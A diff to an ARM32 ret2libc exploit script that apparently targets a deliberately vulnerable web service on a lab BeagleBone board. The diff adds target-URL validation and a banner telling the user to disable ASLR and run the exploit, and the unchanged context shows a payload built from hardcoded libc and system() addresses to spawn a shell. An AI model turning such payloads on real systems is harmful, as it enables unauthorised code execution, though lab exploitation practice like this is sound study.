@@ -26,12 +26,38 @@ Shell appears in the BBB SSH terminal where ./rop-webservice was started.
 """
 
 import sys, os, struct, requests
+from urllib.parse import urlparse
 
 VENV = os.path.join(os.path.dirname(__file__), '..', 'exploit-env',
                     'lib', 'python3.12', 'site-packages')
 sys.path.insert(0, VENV)
 
-TARGET = "http://192.168.7.2:8080"
+def parse_target(raw: str) -> str:
+    """Validate and normalise the target URL using urllib.parse.
+
+    Accepts http[s]://<ipv4-or-ipv6-or-host>[:<port>] and returns it
+    with any trailing slash stripped.  Raises SystemExit on bad input.
+    """
+    try:
+        p = urlparse(raw)
+        port = p.port   # triggers ValueError for out-of-range ports
+    except ValueError as e:
+        sys.exit(f'[-] Invalid TARGET URL: {e}')
+
+    if p.scheme not in ('http', 'https'):
+        sys.exit(f'[-] TARGET must start with http:// or https://  (got: {raw!r})')
+
+    if not p.hostname:
+        sys.exit(f'[-] TARGET has no host: {raw!r}')
+
+    return raw.rstrip('/')
+
+
+if len(sys.argv) != 2:
+    prog = os.path.basename(sys.argv[0])
+    sys.exit(f'Usage: {prog} <target-url>\n  e.g. {prog} http://192.168.7.2:8080')
+
+TARGET = parse_target(sys.argv[1])
 
 # Exact addresses from live process
 LIBC_BASE = 0xb6d5b000
@@ -49,7 +75,28 @@ def build_payload():
     payload += struct.pack('<I', SYSTEM)  # → pc (system(), bit0=1 → back to Thumb)
     return payload
 
+BANNER = """
+╔══════════════════════════════════════════════════════════════╗
+║           get_shell.py — ARM32 ret2libc exploit              ║
+╠══════════════════════════════════════════════════════════════╣
+║  Prerequisites                                               ║
+║                                                              ║
+║  1. BBB connected to this machine (USB or Ethernet)          ║
+║  2. ASLR disabled on BBB:                                    ║
+║       echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  ║
+║  3. Terminal A — SSH into BBB and start the service:         ║
+║       ssh <user>@<bbb-ip>                                    ║
+║       cd ~/rop-vuln-webservice && ./rop-webservice           ║
+║  4. Terminal B — run this script from the repo root:         ║
+║       source exploit-env/bin/activate                        ║
+║       python3 demos/get_shell.py http://<bbb-ip>:8080        ║
+║                                                              ║
+║  The shell appears in Terminal A (the BBB SSH session).      ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
 def main():
+    print(BANNER)
     try:
         r = requests.get(f'{TARGET}/pi/status', timeout=3)
         print(f'[+] Service alive: {r.json()}')
